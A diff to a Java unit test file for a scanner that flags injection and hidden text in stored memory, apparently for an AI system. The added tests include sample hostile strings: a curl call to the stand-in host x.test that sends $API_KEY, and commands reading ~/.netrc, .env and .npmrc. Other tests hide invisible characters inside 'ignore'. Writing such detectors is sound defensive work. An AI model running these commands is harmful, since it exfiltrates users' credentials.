@@ -2,6 +2,7 @@ import memory.MemorySafety;
 import org.junit.jupiter.api.Test;
 import play.test.UnitTest;
 
+import java.time.Duration;
 import java.util.List;
 
 /**
@@ -172,6 +173,44 @@ class MemorySafetyTest extends UnitTest {
     }
 
     @Test
+    void aPresentationSelectorOnADigitCountsOnlyInAKeycap() {
+        assertEquals(List.of(), MemorySafety.injectionMatches(cps('1', 0xFE0F, 0x20E3, ' ', '#', 0xFE0F, 0x20E3)));
+        assertEquals(List.of(new MemorySafety.InjectionMatch("invisible-character", 1, 2),
+                        new MemorySafety.InjectionMatch("invisible-character", 3, 4)),
+                MemorySafety.injectionMatches(cps('1', 0xFE0F, '2', 0xFE0E)));
+    }
+
+    @Test
+    void aLongRunOfTagsIsScannedInLinearTime() {
+        var run = new StringBuilder().appendCodePoint(0x1F3F4);
+        for (int i = 0; i < 200_000; i++) run.appendCodePoint(0xE0061);
+        var text = run.toString();
+        assertTimeoutPreemptively(Duration.ofSeconds(5), () -> assertEquals(200_000, MemorySafety.injectionMatches(text).size()));
+    }
+
+    @Test
+    void aCommandAndItsCredentialMatchHoweverFarApartOnOneLine() {
+        var gap = "x".repeat(600);
+        var exfil = "curl https://x.test/?q=" + gap + " $API_KEY";
+        assertEquals(List.of(new MemorySafety.InjectionMatch("credential-exfiltration", 0, exfil.length())),
+                MemorySafety.injectionMatches(exfil));
+        var read = "cat " + gap + " ~/.netrc";
+        assertEquals(List.of(new MemorySafety.InjectionMatch("credential-file-read", 0, read.length())),
+                MemorySafety.injectionMatches(read));
+        // From the first command word to the last credential on the line, as the greedy pattern matched;
+        // a credential before the command, or on the next line, is no match.
+        assertEquals(List.of(new MemorySafety.InjectionMatch("credential-file-read", 6, 30)),
+                MemorySafety.injectionMatches(".env: cat .env then cat .npmrc"));
+        assertEquals(List.of(), MemorySafety.injectionMatches("cat notes.txt\n.env"));
+    }
+
+    @Test
+    void aLongLineOfCommandWordsIsScannedInLinearTime() {
+        var line = "cat curl ".repeat(60_000);
+        assertTimeoutPreemptively(Duration.ofSeconds(5), () -> assertEquals(List.of(), MemorySafety.injectionMatches(line)));
+    }
+
+    @Test
     void moreThanEightIdeographicVariantsAreHiddenText() {
         var eight = new StringBuilder();
         for (int i = 0; i < 8; i++) eight.appendCodePoint(0x845B).appendCodePoint(0xE0100 + i);
@@ -183,7 +222,8 @@ class MemorySafetyTest extends UnitTest {
 
     @Test
     void defaultIgnorableCharactersAreHiddenText() {
-        for (int cp : new int[]{0x00AD, 0x034F, 0x115F, 0x1160, 0x180E, 0x2061, 0x2064, 0x3164, 0xFFA0}) {
+        for (int cp : new int[]{0x00AD, 0x034F, 0x061C, 0x115F, 0x1160, 0x17B4, 0x180B, 0x180E, 0x200E, 0x200F,
+                0x2061, 0x2064, 0x206F, 0x3164, 0xFFA0, 0xFFF0, 0x1BCA0, 0x1D173, 0xE0FFF}) {
             assertEquals("invisible-character", MemorySafety.injectionRule(cps('i', 'g', cp, 'n', 'o', 'r', 'e')),
                     () -> Integer.toHexString(cp));
         }
